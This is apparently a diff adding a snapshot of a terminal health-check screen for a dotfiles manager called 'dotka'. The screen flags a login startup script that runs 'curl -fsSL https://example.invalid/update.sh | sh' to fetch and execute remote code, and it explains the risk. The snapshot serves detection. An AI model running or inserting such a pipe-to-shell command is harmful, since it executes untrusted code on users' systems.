@@ -1,0 +1,24 @@
+ dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
+  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
+--------------------------------------------------------------------------------
+ > Health check                      | Startup script downloads code            
+                                     |                                          
+ Problems (3)                        | [x] Problem                              
+ > [x] Startup script downloads c... | downloads and runs code at every login   
+   [x] Missing program    hyprlan... | (started from                            
+   [x] Secret readable by others ... | .config/hypr/hyprland.lua:6): curl -fsSL 
+ Notes (1)                           | https://example.invalid/update.sh | sh   
+   [-] Possible leftover  vesktop    |                                          
+                                     | Where                                    
+                                     | .local/bin/rice-autoupdate.sh:2          
+                                     |                                          
+                                     | What it means                            
+                                     | A script that runs automatically         
+                                     | downloads code from the internet and runs
+                                     | it.                                      
+                                     |                                          
+                                     | What you can do                          
+                                     | read the script; remove it from startup  
+                                     | if you do not trust the source           
+--------------------------------------------------------------------------------
+ j/k move   tab detail   r refresh   ? help   q quit                            
